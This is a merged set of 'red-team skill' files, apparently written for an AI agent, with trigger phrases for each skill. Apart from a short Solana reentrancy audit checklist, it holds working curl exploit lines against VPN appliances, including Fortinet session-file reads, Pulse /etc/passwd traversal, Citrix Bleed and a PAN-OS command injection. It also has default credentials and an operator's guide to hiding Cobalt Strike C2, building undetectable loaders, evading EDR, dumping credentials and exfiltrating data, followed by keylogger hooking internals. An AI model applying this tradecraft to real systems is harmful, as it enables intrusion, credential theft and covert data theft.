# MERGED SOURCE KNOWLEDGE: redteam-operations

316 unique sections from 10 source files. Each section appears in exactly one target.


## SOURCE: hunt-skills/bountyforge/skills/smart-contract-audit/reference/anchor/fv-anc-5-cross-program-invocation-cpi/fv-anc-5-cl10-cross-program-reentrancy-via-callback.md

## TLDR

Solana's CPI depth limit does not prevent reentrancy when program A calls program B which calls back into program A at a different instruction before A's state is finalized. Unlike EVM, there is no automatic reentrancy guard at the runtime level; account state is accessible across CPI hops within the same transaction, and a callback into the caller can observe intermediate or inconsistent state.

## Detection Heuristics

**CPI to Program Accepting a Callback Target**
- Program calls an external program that accepts a callback target address as an instruction parameter; that external program may invoke instructions on the protocol before the outer instruction completes
- Hook-style architectures (e.g., transfer hooks, liquidation hooks) that allow user-supplied callback program IDs without restricting which programs can be called
- No reentrancy guard flag in any account state checked at instruction entry

**State Read Before CPI, Written After**
- A security-critical account field (balance, borrow amount, share count) is read before an external CPI call and written after, with no lock preventing the external program from reading the intermediate value
- The protocol's invariant check (e.g., collateral ratio, available liquidity) occurs after all CPIs have returned rather than before any external call

**Missing Reentrancy Guard**
- No boolean `is_executing` or `reentrancy_guard` field in any program-owned account that is set to true at instruction entry and reset on exit
- No check that an instruction is not reentrant via a stored slot or instruction counter in the program's global state account

## False Positives

- All external calls are to known static programs (SPL Token, System Program) that do not accept user-supplied callbacks and have no callback mechanism
- Callback target is validated against an allowlist of trusted non-reentrant programs before the CPI
- Reentrancy guard flag stored in account state is checked and set atomically at instruction entry


## SOURCE: hunt-skills/enterprise-vpn-attack/SKILL.md

## When to use this skill

Trigger when recon surfaces:
- `*.<client>.example/+CSCOE+/logon.html` or similar `+CSCOE+` paths → Cisco ASA / AnyConnect
- `intranet.*` / `vpn.*` / `connect.*` / `webvpn.*` / `wc.*` / `remote.*` subdomains
- Port 443 returning login pages with `Server: Apache` or banner like "AnyConnect", "FortiGate", "NetScaler", "GlobalProtect", "Pulse", "Ivanti"
- TCP 8443 / 4443 / 10443 / 8888 (common VPN web-mgmt ports)
- HTTP responses with `Set-Cookie: webvpn=` (Cisco) / `SVPNCOOKIE=` (Fortinet) / `NSC_AAA=` (Citrix) / `DSAuthSession=` (Pulse) / `BIGipServer*` (F5)

DO NOT use for:
- Internal lateral-movement post-foothold (out of scope per user's boundary)
- VPN client-side bugs (different attack class)
- IPsec / L2TP / OpenVPN (different protocols, not SSL VPN web stack)

---

### Cisco ASA / AnyConnect
```bash
curl -skI 'https://target/+CSCOE+/logon.html' | head -10

# Look for: Set-Cookie: webvpn=; X-Frame-Options: SAMEORIGIN; CSP: ... block-all-mixed-content

# Login page contains: "AnyConnect", "CSCOE", "logon.html"
```
ASA version: not banner-disclosed in modern builds; need to derive from JS file paths or test specific paths.

```bash

# Path-based version hints (older builds leaked builds in URLs)
curl -sk 'https://target/+CSCOE+/sdesktop/scan-finalize?path=test'
curl -sk 'https://target/+CSCOE+/saml/sp/metadata'         # 200 = SAML auth enabled
curl -sk 'https://target/CSCOSSLC/config-auth'             # AnyConnect handshake endpoint
```

### Fortinet FortiGate / FortiOS
```bash
curl -skI 'https://target/remote/login' | head -10

# Login page contains: "FortiGate", "Fortinet", "SSL-VPN"
```
Version: `/remote/info` sometimes leaks (older), or `/login?username=` 302 response

### Citrix NetScaler / ADC / Gateway
```bash
curl -skI 'https://target/' | head -10

# Version banner
curl -sk 'https://target/vpn/index.html' | grep -oE 'NetScaler/[0-9.]+|NS[0-9.]+'
curl -sk 'https://target/menu/neo'                # 200 if vulnerable to CVE-2019-19781 era
```

### Palo Alto GlobalProtect
```bash
curl -skI 'https://target/global-protect/login.esp' | head -10

# Look for: Set-Cookie: PHPSESSID= (yes, GP uses PHP), Server: Apache (PA-VM internal)

# Version banner via login page
curl -sk 'https://target/global-protect/login.esp' | grep -oE 'GlobalProtect Portal[\s\S]{0,200}'

# Or check meta tag
curl -sk 'https://target/global-protect/login.esp' | grep -oE 'panui-[0-9.]+'
```

### Pulse Secure / Ivanti Connect Secure
```bash
curl -skI 'https://target/dana-na/auth/url_default/welcome.cgi' | head -10

# Version
curl -sk 'https://target/dana-na/auth/url_default/welcome.cgi' | grep -oE 'Pulse Connect Secure[^<]*|ivanti[^<]*[0-9.]+'
```

### SonicWall NetExtender / SMA
```bash
curl -skI 'https://target/cgi-bin/welcome' | head -10

### Cisco ASA / AnyConnect

| CVE | Affects | Type | Test |
|---|---|---|---|
| **CVE-2018-0296** | ASA pre-9.x specific builds | Path traversal — info disclosure (sessions, config) | `GET /+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua` |
| **CVE-2020-3452** | ASA, FTD before specific patch levels | Path traversal — file read | `GET /+CSCOE+/files/file_name.html?Filename=Microsoft.Manifest+/+CSCOT+/lua/test.lua` and variations |
| **CVE-2023-20269** | ASA, FTD specific | Auth bypass on SSL VPN | Brute-force a group + valid creds combo against `/+webvpn+/index.html` |
| **CVE-2024-20481** | RAVPN | DoS via crafted handshake | **SKIP in red team — disruptive** |

```bash

# Cisco CVE-2020-3452 — file read
curl -sk 'https://target/+CSCOE+/files/file_name.html?Filename=Microsoft.Manifest+/+CSCOT+/lua/test.lua' | head -5

# Cisco CVE-2018-0296 — path traversal
curl -sk 'https://target/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua' | head -20

### Fortinet FortiGate / FortiOS

| CVE | Affects | Type | Test |
|---|---|---|---|
| **CVE-2018-13379** | FortiOS 5.4-6.0 | Path traversal — sslvpn_websession file read | `GET /remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession` |
| **CVE-2022-42475** | FortiOS 7.x specific | Heap overflow — pre-auth RCE | Complex exploit; test with `nuclei` template `CVE-2022-42475` |
| **CVE-2023-27997** (XORtigate) | FortiOS various | Heap overflow — pre-auth RCE | Public PoCs exist; nuclei template available |
| **CVE-2024-21762** | FortiOS 6.x-7.x | OOB write — pre-auth RCE | Public PoC; nuclei template `CVE-2024-21762` |
| **CVE-2024-55591** | FortiOS 7.0-7.4 | Auth bypass on FortiOS Node.js websocket admin interface | `GET /endpoint` on admin-interface port |

```bash

# Fortinet CVE-2018-13379 — most reliably-fingerprintable file read
curl -sk --path-as-is 'https://target/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession'

# Fortinet credential dump format (from CVE-2018-13379 dumps that hit pastebin in 2021):

### Citrix NetScaler / ADC / Gateway

| CVE | Affects | Type | Test |
|---|---|---|---|
| **CVE-2019-19781** (Shitrix) | ADC/Gateway 10.5-13.0 specific | Path traversal → RCE via XML upload | `GET /vpn/../vpns/cfg/smb.conf` |
| **CVE-2022-27518** | ADC/Gateway with SAML configured | Pre-auth RCE | Complex; test with nuclei |
| **CVE-2023-3519** | NetScaler ADC/Gateway 13.0-13.1 specific | Pre-auth RCE via crafted HTTP | Public PoCs exist |
| **CVE-2023-4966** (Citrix Bleed) | NetScaler ADC/Gateway 13.0-14.1 | Memory disclosure → session token theft | `POST /oauth/idp/.well-known/openid-configuration` with crafted Host header — long Host header triggers memory leak in response |

```bash

# Citrix Bleed (CVE-2023-4966) detection
HOST=$(python3 -c "print('A' * 24812)")
curl -sk -X POST -H "Host: $HOST" "https://target/oauth/idp/.well-known/openid-configuration" -o response.txt

# CVE-2019-19781 file read
curl -sk --path-as-is 'https://target/vpn/../vpns/cfg/smb.conf'
```

### Palo Alto GlobalProtect

| CVE | Affects | Type | Test |
|---|---|---|---|
| **CVE-2024-3400** | PAN-OS 10.2-11.1 with GP enabled | Command injection — pre-auth RCE | `POST /ssl-vpn/login.esp` with crafted Cookie header containing `SESSID=../../../var/log/pan/test.txt` |

```bash

# CVE-2024-3400 detection
curl -sk -X POST 'https://target/ssl-vpn/login.esp' \
  -H 'Cookie: SESSID=../../../var/log/pan/test_$(id)_test.txt' \
  --data 'jsessionid=test'

# Look for file-creation side-effect on test path — palo creates file with command output
```

### Pulse Secure / Ivanti Connect Secure / Policy Secure

| CVE | Affects | Type | Test |
|---|---|---|---|
| **CVE-2019-11510** | Pulse Connect Secure 8.x-9.x | Arbitrary file read | `GET /dana-na/../dana/html5acc/guacamole/../../../../../../../etc/passwd?/dana/html5acc/guacamole/` |
| **CVE-2021-22893** | Pulse Connect Secure 9.x | Pre-auth RCE | Complex multi-step; test with nuclei |
| **CVE-2024-21887** | Ivanti Connect Secure 9.1-22.6 | Command injection on web component | `POST /api/v1/totp/user-backup-code/` with crafted body |
| **CVE-2023-46805** | Ivanti Connect Secure 9.1-22.6 | Auth bypass | Combined with 21887 for full chain |

```bash

# CVE-2019-11510 — Pulse file read
curl -sk --path-as-is 'https://target/dana-na/../dana/html5acc/guacamole/../../../../../../../etc/passwd?/dana/html5acc/guacamole/'
```

### SonicWall

| CVE | Affects | Type | Test |
|---|---|---|---|
| **CVE-2021-20016** | SMA 100 series specific firmware | SQL injection — pre-auth | nuclei template available |
| **CVE-2024-40766** | SonicOS specific | Access-control flaw | Specific firmware versions |

---

## SAML SP / IdP misconfigurations (always check)

Most enterprise VPNs now use SAML for SSO. Check SP metadata:

```bash

# Citrix
curl -sk 'https://target/saml/login' | head -30
```

Look for:
- `AuthnRequestsSigned="false"` → see `hunt-saml` for XSW exploitation
- `WantAssertionsSigned="false"` → severe; assertion-replay possible
- Audience-restriction validation gaps
- Public SP signing cert (for replay/forging attacks)

---

## Default credentials (test sparingly — lockout risk)

| Vendor | User | Password | Notes |
|---|---|---|---|
| Cisco ASA | admin | cisco | Default factory; rarely seen in prod |
| Cisco ASA | enable_15 | cisco | Console |
| Fortinet | admin | (empty) | Factory default |
| Citrix NetScaler | nsroot | nsroot | Factory default |
| Citrix NetScaler | nsroot | (serial number) | Newer firmware |
| Palo Alto | admin | admin | Factory default |
| Pulse Secure | admin | password | Factory; CIS-hardened changes this |
| F5 Big-IP | root | default | Factory |
| F5 Big-IP | admin | admin | Common alternate |
| SonicWall | admin | password | Factory |

⚠ Most enterprise targets have changed these. Test ≤2 attempts per account to avoid lockout.

---

## Group / tunnel-group enumeration (Cisco-specific)

Cisco ASA AAA groups can sometimes be enumerated without auth.

```bash

# Tunnel group enumeration via timing
for group in DefaultRAGroup DefaultWEBVPNGroup SSLVPN Employees Contractors Vendors Partners Sales Marketing IT; do
  ms=$(curl -sk --max-time 10 -o /dev/null -w "%{time_total}" \
    -X POST "https://target/+webvpn+/index.html" \
    -d "username=test&password=test&group_list=$group&tgroup=&Login=Login")
  echo "$group: ${ms}s"
done

# Larger differential timing = group exists; valid groups respond slower in some builds
```

---

## AAA backend identification

After auth fails, look at error response details:

| Pattern in response | AAA backend |
|---|---|
| `a0=2` (Cisco) | Unknown user |
| `a0=3` (Cisco) | Wrong password |
| `a0=4` (Cisco) | Login restricted |
| `a0=12` (Cisco) | Account locked |
| `a0=115` (Cisco) | Generic auth fail (LDAP/RADIUS/AD layer error) |
| AADSTS in response body | Backed by Entra (SAML) |
| `Authentication failed via RADIUS` | RADIUS backend |
| `Invalid username or password` (generic) | LDAP or local DB |

If you see SAML/Entra in the flow, pivot to `m365-entra-attack` skill for cred-spray strategy.

---

## Common probe sequence (5-minute fingerprint)

```bash
TARGET="vpn.target.com"

# Cisco
curl -skI "https://$TARGET/+CSCOE+/logon.html" 2>&1 | head -3
curl -sk "https://$TARGET/+CSCOE+/saml/sp/metadata" -o /tmp/cisco_saml.xml; ls -la /tmp/cisco_saml.xml
curl -sk --path-as-is "https://$TARGET/+CSCOE+/files/file_name.html?Filename=Microsoft.Manifest" -o /tmp/cisco_cve.html

# Fortinet
curl -skI "https://$TARGET/remote/login" 2>&1 | head -3
curl -sk --path-as-is "https://$TARGET/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession" -o /tmp/forti_cve.txt; head -c 200 /tmp/forti_cve.txt

# Citrix
curl -skI "https://$TARGET/" 2>&1 | head -3
curl -sk --path-as-is "https://$TARGET/vpn/../vpns/cfg/smb.conf" -o /tmp/citrix_cve.txt; head -c 200 /tmp/citrix_cve.txt
HOST=$(python3 -c "print('A' * 24812)")
curl -sk -X POST -H "Host: $HOST" "https://$TARGET/oauth/idp/.well-known/openid-configuration" -o /tmp/citrix_bleed.txt
wc -c /tmp/citrix_bleed.txt

# Pulse / Ivanti
curl -skI "https://$TARGET/dana-na/auth/url_default/welcome.cgi" 2>&1 | head -3
curl -sk --path-as-is "https://$TARGET/dana-na/../dana/html5acc/guacamole/../../../../../../../etc/passwd?/dana/html5acc/guacamole/" -o /tmp/pulse_cve.txt; head -c 200 /tmp/pulse_cve.txt
```

---

## Nuclei templates for fast triage

Nuclei has high-quality templates for most of the above CVEs. Single command sweeps:

```bash
nuclei -u https://target/ \
  -tags vpn,cisco-asa,fortinet,citrix,palo-alto,pulse-secure,sonicwall,f5 \
  -severity high,critical -rl 5
```

Add `-as` (auto-scan) for broader vuln coverage but slower.

---

## Operational discipline

- **Banner-stripped servers (no version disclosure)** are good defense-in-depth — record as positive finding even if no CVE found
- **Rate-limit yourself** — these appliances often log every request to a SIEM. Patient pace, jittered timing.
- **SAML metadata is anonymous** — pull it. It's intel about AAA backend.
- **Don't run pre-auth-RCE PoCs in red team without explicit OK** — accidentally bricking a VPN concentrator = catastrophic for the client. Detection-only tests first, then escalate with permission.
- **Document the AAA backend identification** — knowing whether ASA uses RADIUS-to-local vs SAML-to-Entra changes downstream attack paths.

---

## Bridge to neighboring skills

- `m365-entra-attack` — when AAA backend is Entra SAML; cred-spray strategy carries over
- `hunt-saml` — XSW / signature-stripping if SAML SP is misconfigured
- `mid-engagement-ir-detection` — appliances generate noisy logs; watch for IPS rules being deployed mid-engagement
- `redteam-mindset` — banner-stripped ≠ "not vulnerable"; keep digging via behavioral fingerprints

---

## Anti-patterns

- **Don't conclude "patched" from a 404 on one CVE path** — patches deploy unevenly; test 3+ CVEs per vendor
- **Don't trust the version banner alone** — appliance vendors often backport fixes without bumping the version string
- **Don't run heavy nuclei scans without rate-limiting** — these appliances are critical infrastructure
- **Don't fingerprint by trying all CVE PoCs immediately** — start with non-disruptive HEAD + version-banner probes
- **Don't skip SAML metadata** — even when the appliance is patched, SAML SP misconfig is its own attack surface

---

## Related Skills & Chains

- **`hunt-rce`** — Every major VPN appliance (Pulse Secure, Fortinet, Citrix, Ivanti, Palo Alto) has shipped pre-auth path-traversal-to-RCE in the last 24 months. Chain primitive: VPN appliance CVE (e.g., Ivanti ICS CVE-2024-21887, Citrix Bleed CVE-2023-4966, Fortinet CVE-2024-21762) → `hunt-rce` pre-auth path traversal → arbitrary file write into web-root → request the file → web-shell as `root` → VPN config + LDAP bind credentials extracted.
- **`hunt-saml`** — VPN SAML SP misconfig persists even on fully-patched appliances. Chain primitive: appliance patched against latest CVE but `/saml/metadata` reachable → IdP fingerprinted → `hunt-saml` XSW or comment-injection against IdP → forged assertion → VPN session established without password/MFA.
- **`vmware-vcenter-attack`** — Post-VPN-foothold the natural next pivot is vCenter. Chain primitive: VPN web-shell → cred extraction from VPN appliance config (LDAP bind, RADIUS shared secret) → reuse against internal vCenter → if scope permits, `vmware-vcenter-attack` → datacenter takeover.
- **`hunt-ntlm-info`** — Some VPN appliances expose anonymous NTLM on management paths. Chain primitive: VPN admin portal NTLM Type-2 capture → `hunt-ntlm-info` AV_PAIR decode → internal AD forest name → `m365-entra-attack` Entra spray on synced tenant.
- **`mid-engagement-ir-detection`** + **`redteam-report-template`** — VPN appliance CVE exploitation is high-noise; SOC patches fast. Chain primitive: confirmed CVE → baseline capture via `mid-engagement-ir-detection` → if appliance updates mid-test, capture the patched-state as a SECOND finding → run both findings through `triage-validation` → package via `redteam-report-template` with explicit critical-infrastructure framing.


## SOURCE: hunt-skills/infrastructure/offensive-advanced-redteam/SKILL.md

## Metadata
- **Skill Name**: advanced-redteam-ops
- **Folder**: offensive-advanced-redteam
- **Source**: https://github.com/SnailSploit/offensive-checklist/blob/main/Advanced%20red-team%20operations%20for%20dummies.md

## Description
Practical advanced red team operations guide: OPSEC discipline, C2 infrastructure design, living-off-the-land techniques, lateral movement, persistence, data exfiltration, and evading modern defenses. Use for planning advanced red team engagements or understanding APT TTPs.

## Trigger Phrases
Use this skill when the conversation involves any of:
`advanced red team, red team operations, OPSEC, C2 infrastructure, living off the land, LOTL, lateral movement, persistence, exfiltration, APT, advanced threat, red team for dummies`

## Redirectors
Your CStrike, BRC4, etc., team server should ONLY bind locally. NEVER bind to 0.0.0.0 or an external-facing interface; always bind locally and have a redirector/tunnel expose it to the outside world.

On Cloudflare, you can use `Zero Trust` to create a tunnel.
Here's how to host your CStrike **teamserver** behind a redirector.
1. Start your server on your VPS:
	`./TeamServerImage -Dcobaltstrike.server_port=50050 -Dcobaltstrike.server_bindto=127.0.0.1 -Djavax.net.ssl.keyStore=./cobaltstrike.store -Djavax.net.ssl.keyStorePassword=0123456 teamserver 127.0.0.100 lovestrange` ; change lovestrange with your PW. This will bind CS to 127.0.0.1:50050.
	
2. CStrike teamservers and clients (not beacons) use raw TCP. We can't host that directly behind Cloudflare, so we smuggle it within WebSocket traffic with `websocat`:
	1. `websocat -E -b ws-l:SOURCE tcp:DESTINATION &`
	2. source = where `websocat` will listen/where you will point your tunnel. i.e., 127.0.0.1:40000
	3. destination = teamserver's IP + port
	4. final cmd: `websocat -E -b ws-l:127.0.0.1:40000 tcp:127.0.0.1:50050 &`
3. Now, point your tunnel at this address.
	1. For a temporary tunnel, use `cloudflared`:
		1. `cloudflared tunnel --url http://127.0.0.1:40000 --no-autoupdate`
	2. Otherwise, use a named Cloudflare tunnel within Zero Trust, point it to your domain + a specific path (long UUIDs are best), and point it to `http://127.0.0.1:40000`.
**VPS part is done!** Do the following on your machine before starting Cobalt Strike:
4. `websocat -E -b tcp-l:127.0.0.1:2222 ws://mytunnel.domain.com/lovestrange &` ; replace `/lovestrange` with the path you just set OR replace the domain with the link `cloudflared` gave you.
5. Start your Cobalt Strike client and connect to 127.0.0.1:2222.
6. Done :)

If your origin traffic is HTTPS you can skip the websocat part and directly point your Cloudflare tunnel to your service. you can either use Cloudflare's TLS certificate (best) or tell CF not to check origin's TLS cert

Benefits of this: much better OPSEC. A lot of team servers get taken down because they listen eternally and get scanned through Shodan then taken down. You can also use `ngrok` temporary tunnels. Tunneling HTTP is the easiest thing to do.
- The **teamserver ↔ operator** channel is raw TCP (hence `websocat`).
- The **beacon ↔ teamserver** channel is whatever your Malleable profile says (HTTP/S, DNS, etc.) and can live behind the same domain; just use different subdomains/paths.
    Diagram:
```
Operator ──(raw TCP)──► websocat ──(WS)──► cloudflared ──► Internet ──► Cloudflare edge ──► teamserver 127.0.0.1:50050

Beacon ──(HTTPS Malleable)──► same domain/different path ──► Cloudflare edge ─(TLS terminates)─► nginx ──► teamserver 127.0.0.1:443
```

## Beacon Profiles
EDIT THE BASE PROFILE! (you can text me on TG for a good profile)

Never use the default CStrike profile; always edit it as much as you can.
- **Disable Staging:** Unless absolutely necessary for standard shellcode injection, set `host_stage = false`
- Staged payloads are noisy, easier to signature and unnecessary if you are using loaders.
	- CStrike's staged payload is super detected anyway.
- **Mimic Real Traffic:** If you can, don't just randomize; profile legitimate traffic (e.g., Microsoft Teams, standard Azure API chatter) and clone it closely—matching URIs, headers, and User-Agents.
- **Memory Obfuscation:** Ensure your profile includes `set sleep_mask "true";` (encrypts heap while sleeping) and `set obfuscate "true";` (to avoid generic signature scanning in memory). Look at the sleep mask guides for CStrike.
- **Certificate Opsec:** If using HTTPS, never use the default self-signed certs. Use valid certificates (Let's Encrypt is fine) and ensure your C2 profile's `https-certificate` block matches the real certificate exactly (especially the Java Keystore specifics) to avoid fingerprinting.
	- This doesn't matter if your team server is behind an HTTP(S) redirector like `cloudflared` because TLS terminates there anyway. Be sure to set your Cloudflare tunnel to allow self-signed TLS certs.
	- I have seen some orgs ban Let's Encrypt certs altogether, but they are extremely large corporations. If you care about these targets, maybe you can invest in a real TLS cert, no? ;)

## Infrastructure Segregation
Never run all operations from one VPS or domain; use a tiered approach so that burning one asset doesn't kill the engagement:

- **Tier 1 - Phishing/Delivery:** High-reputation domains, typically short-lived. Used ONLY to get the initial payload to the target. Once an email is flagged, this tier is burned. Warm up the domain for ~2 weeks.
    
- **Tier 2 - Interactive C2 (Short-haul):** Used for active hands-on-keyboard work. Higher risk of detection due to frequent traffic.
    
- **Tier 3 - Long-haul C2 (Persistence):** Low and slow. Connects back once a day/week. Used only to respawn Tier 2 access if it gets burned. NEVER run active commands through this if avoidable. Uses DNS or another stealthy protocol.

For more mature operations, you could use different C2 frameworks for different tiers. A lightweight, lesser-known C2 could be used for long-haul persistence, while a more feature-rich framework like Cobalt Strike could be reserved for active, short-haul operations.

## Malwareful Operations
**Phish or vish** -> get an employee to run your payload.

Your stage 0 payload is an extremely light, self-contained loader (>30kb). 
- It should NOT be a .exe because these are very often blocked.
	- I won't reveal our TTPs or anything that could help EDR vendors, so figure this out on your own ))
		- Know your target's stack tho: will your payload not get blocked?
- It HAS to be FUD (Fully Undetectable).
- It should NOT do anything other than download/extract/inject stage 1.

- Stage 1 is a very minimal implant (like Merlin or, my excellent product aimed at EDR evasion, [Shikine](https://t.me/teamkavkaz25)) that can:
	- Act as a minimal reverse shell (support 5-6 commands: ls, whoami, pwd, download, upload, execute). You make this persistent until an operator uses it to download stage 2.
	- It SHOULD be FUD because it might be written to disk.

- Stage 2 is a post-exploitation beacon like Cobalt Strike that you only load after killing AV/EDR or having a strong foothold on the victim.
	- You can now remove stage 1 from persistence and make stage 2 persistent with registry keys or something similar.
	- You shouldn't write it to disk; have it be extracted and injected at runtime on reboot, etc.
- Stage 2s are usually heavily signatured. Think: **do you really need Cobalt Strike/BRC4**?

- Stage 2 is the most signatured type because a lot of people use it as stage 0.

- Goal is to attack for persistence rather than attack for command execution.
- Every stage should be redundant. If your stage 0 downloads stage 1 over HTTPS and your target has a whitelist-based firewall, you'll be in trouble unless you use DNS as a backup.
	- This requires on-the-clock R&D time that you could avoid by baking in this redundancy and making it try many different methods/protocols when developing it.

- Many EDRs flag a process as suspicious if it's spawned by an unusual parent (`winword.exe` spawning `powershell.exe`). Your Malleable C2 profile or post-exploitation jobs can be configured to spawn processes from more legitimate-looking parents like `explorer.exe`.
	- Most AVs stop tracking after two generations. For EDRs, aim at spoofing three generations if you can.

## General Infrastructure Rules/Tips
- Have a list of TTPs you **blacklist** (like using `powershell.exe -Command [...]`, `rundll32.exe`, etc.) for better OPSEC.
- *Always* use encryption, even when your communications are internal.
	- One time during an operation, I had root access to a box and was able to escalate privileges to the whole network by listening to TCP traffic because all machines on the network sent my machine credentials in clear-text/raw HTTP. The traffic was local, but still. If they had used SSL, I wouldn't have been able to do much. ;)
- Have two types of beacons when you can:
	- A long-haul one that uses DNS or other covert channels to exfiltrate data, sleeps a lot, and can be used for the long-term or as a backup solution.
	- A short-haul beacon that uses HTTP, used for hands-on operations.
- When you infect a network, use SMB listeners. That is, set machines (and beacons) B, C, and D to use SMB listeners to relay traffic to machine A, where A is a short-haul beacon. They are much stealthier.
- Don't just forward all traffic to your team server. Blue teams will scan your infrastructure.
	- **Dumb Redirector:** `iptables`/`websocat` just forwarding port X to team server 443. (Bad OPSEC, easily fingerprinted).
	- **Smart Redirector:** Use Nginx or Apache with specific rules.
    - Filtering: Only forward traffic to the team server if it matches your specific Malleable C2 User-Agent and URIs *(hint: use a custom HTTP header like `session_id` to transmit your data and filter beacons from blue-teamers.)*
    - Deflection: If traffic doesn't match (e.g., a Shodan scanner or blue team hitting your domain), proxy pass it to a legitimate site (like generic Microsoft or Amazon pages).
- **Avoid "Easy" Built-ins:** `psexec` (even the Cobalt Strike version) creates very predictable service installation artifacts (Event ID 7045). Avoid it unless you absolutely know logging is disabled. 
- **WinRM Preferred:** If you have credentials, WinRM is generally cleaner and blends in better with admin traffic than SMB service creation.
- **Bring Your Own Tools (BYOT) Carefully:** Don't drop a standard compiled Mimikatz to disk. Use sleep-masked in-memory execution, or better yet, use alternative credential dumping methods (like dumping LSASS via legitimate Microsoft binaries (`comsvcs.dll`), though this is heavily watched now too).
	- Ideally, NEVER write any tooling to disk.
- **Jitter and Sleep:** NEVER use 0 sleep unless actively working on a box. Even then, consider 1-3s sleep. For standard beacons, use a high jitter (e.g., sleep 60 with jitter 37) to avoid mathematically predictable beacon intervals that NDRs easily spot.
- **Kill Dates:** Always set a kill date on your beacons. You don't want a forgotten zombie beacon calling back to your infrastructure 3 years later during someone else's audit.
- **Timestomping:** When dropping files to disk, match the creation/modification timestamps of legitimate files in the same directory (`timestomp` command) to blend in during casual forensic reviews.
- **USE AS MANY LOLBINS AS YOU CAN!**: I've had many cases where using an API to do something (like downloading a payload through WinSock) was blocked/checked by an EDR, but using a LOLBin for it was completely fine (`curl.exe`).
	- Live off the land (LOTL) as much as you can. Use built-in tools as much as you can to avoid bringing your own stuff.

#### Data Exfiltration

- **Stealthy Data Transfer:** You can use DNS tunneling for small, important files like passwords or smuggling data in seemingly normal HTTP traffic.
- **Know Your Target's Stack:** If they just have Splunk and ClamAV, you can be bold and do whatever you want.
	- Once in an operation, my target only had Splunk and no AV, so I zipped important files through a reverse shell, hosted a basic HTTP server with Python, and used an HTTP tunnel (`cloudflared`) to exfiltrate 80GB of data after office hours. )


hackerz 4 lyfe
***Lovestrange | TEAM KAVKAZ***
TG @ **lovestrangekz**


## SOURCE: hunt-skills/infrastructure/offensive-keylogger-arch/SKILL.md

## Metadata
- **Skill Name**: keylogger-architecture
- **Folder**: offensive-keylogger-arch
- **Source**: https://github.com/SnailSploit/offensive-checklist/blob/main/Low-level%20Keylogger%20architecture_.md

## Description
Low-level keylogger architecture design: kernel driver hooks (WH_KEYBOARD_LL, SetWindowsHookEx), ETW-based input capture, user-mode vs kernel-mode approaches, stealth techniques, and data exfiltration. Use for understanding input capture mechanisms, EDR evasion research, or malware architecture analysis.

## Trigger Phrases
Use this skill when the conversation involves any of:
`keylogger, keyboard hook, WH_KEYBOARD_LL, SetWindowsHookEx, ETW, kernel driver, input capture, low-level keylogger, malware architecture, stealth, exfiltration`

## Full Methodology



Case study of different keylogger implementations, how to implement them and their individual IOCs.

---

## SetWindowHookEx
Majority of malware uses user32.dll!SetWindowHookEx to create a global hook event. this modifies an internal structure in `win32k.sys`.
Internally, `SetWindowsHookEx` is just a user-mode wrapper around `NtUserSetWindowsHookEx` (which itself wraps around `zzzzNtUserSetWindowsHookEx`) in `win32k.sys`.  What happens after you call it depends on the **hook type** you request but the sequence is always the same four steps:

1. **Validate and allocate a hook record**  
   `win32k.sys` creates an internal `HOOK` structure, fills in the filter type, module handle, thread/desktop IDs, and inserts the structure at the **head of the global hook chain** for that type
2. **Decide whether the hook procedure must live in the target process**  
   - **Low-level hooks (`WH_KEYBOARD_LL`, `WH_MOUSE_LL`)**  
     – **NO** injection.  
     – The system leaves the hook DLL in the **original caller’s address space** and simply delivers the event to that process via an internal `WM_*` message posted to its **hidden “ghost” window** .  
   - **All other global hooks (`WH_KEYBOARD`, `WH_CBT`, `WH_GETMESSAGE`, …)**  
     – **YES** injection required.  
     – For every process that satisfies the filter (same desktop, matching bitness),
	   - In/before Vista: `win32k` queues an **asynchronous load request** to `csrss.exe`, which in turn calls `LoadLibraryEx` inside the target process, mapping the hook DLL and fixing up its entry point.
	   - After Vista: The target process is added to a **pending-load list** inside `win32k`; the **first user-mode exit** from kernel to that process takes the APC and calls `LdrLoadDll` directly.
     – The first time the target thread is about to return to user mode, the kernel **APCs** the loader, so the DLL’s `DllMain` runs in the context of the victim process.

3. **Event routing at runtime**  
   When the monitored event occurs (key press, window activation, etc.), `win32k` walks the hook chain **inside the thread that owns the input queue**.  
   - If the hook procedure lives in that process, the kernel simply **calls the address** inside the injected DLL.  
   - If the procedure lives in another process (low-level case), the kernel **marshals the raw parameters** (`KBDLLHOOKSTRUCT` / `MSLLHOOKSTRUCT`) into an internal message and posts it to the **installing thread’s message queue**.  
     That thread must keep pumping messages; otherwise, the system **blocks all further input** for the desktop, which is why low-level hooks are so easy to detect by their side-effect on system responsiveness.

4. **Mandatory `CallNextHookEx`**  
   Each hook handler **must** call `CallNextHookEx` to pass control down the chain.  
   Internally, `CallNextHookEx` is just a call back into `win32k`, which continues the chain walk; if any handler fails to call it, the chain is broken and subsequent handlers never run. This might break input for the whole session.

#### TLDR
- **Low-level hooks** look stealthy because **no foreign code is mapped**, but they **pin the installing thread** and are trivially detected by their **message-queue footprint**.  
- **Regular global hooks** achieve **true code injection** without `WriteProcessMemory` or `CreateRemoteThread`, but they **leave a mapped DLL** behind in every hooked process. Easy VAD artefact for EDRs.
	- most EDRs avoid exhaustive VAD walks for every process on every event due to performance, but many will do targeted scans on on suspicious events (allocation > 64 kB, RWX, etc.).
- The **hook chain is global per desktop**: once installed, your procedure sees **every qualifying event** on that desktop, which is why a single call can key-log the whole user session.

### IOCs:
- Could be caught by a hook in user32
- Additional entry in the VAD (EDRs can check if the DLL is signed),
- Mapped or on-disk DLL
	- Is it signed?
		- Memory scanners could detect non-backed-by-disk executable memory.
	- Does it have anything to do here?
	- Could be bypassed by ovewriting a present, mapped DLL with our memory?
		- Would need to prevent user from interacting with keyboard while it happens.


---

## NtUserSetWindowsHookEx / zzzzNtUserSetWindowsHookEx
Same as above but you're directly calling the lower-level function. Same IOCs, really. You're only bypassing potential hooks in user32.dll.
The full logic of these functions could be reimplemented fully without a jump to external modules but it has too much IOCs and is too complex to implement to really be interesting.

**Session boundary**: raw-input registration is **per-session**, not per-desktop.  
A service in session-0 **cannot** register for keyboard raw-input and expect to see session-1 keystrokes – the HID packets are **routed to the session that owns the target HWND**.  
(You **can** open the **physical keyboard device object** directly and parse HID, but that is a **completely different attack surface** – needs admin, bypasses win32k.)

### IOCs:
- Additional entry in the VAD (EDRs can check if the DLL is signed),
